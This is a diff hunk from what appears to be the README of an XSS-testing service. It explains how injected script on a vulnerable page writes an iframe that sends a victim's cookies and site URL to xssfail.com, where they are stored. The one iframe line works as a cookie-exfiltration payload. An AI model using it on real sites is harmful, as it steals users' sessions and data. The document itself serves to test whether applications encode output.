@@ -12,9 +12,7 @@ into target text field and save it. Any text field could be used (Product name, 
 2. UserA opens page with list of products with product you've injected.
 3. If html engine doesn't encode strings UserA will get javascript executed.
 4. Injected javascript code writes (document.write) the following tag: 
-
-    <iframe src="http://xssfail.com/form?param1=&param2=&paramN=" />
-
+    &lt;iframe src="http://xssfail.com/form?param1=&param2=&paramN=" /&gt;
 where param1, param2, paramN - all information about UserA (including browser cookies, site url etc.)
 5. After iframe is loaded it executes script which saves info from URL (param1, param2, param3) into CouchDb database.
 6. You can go to xssfail.com and search for "WINNERS".
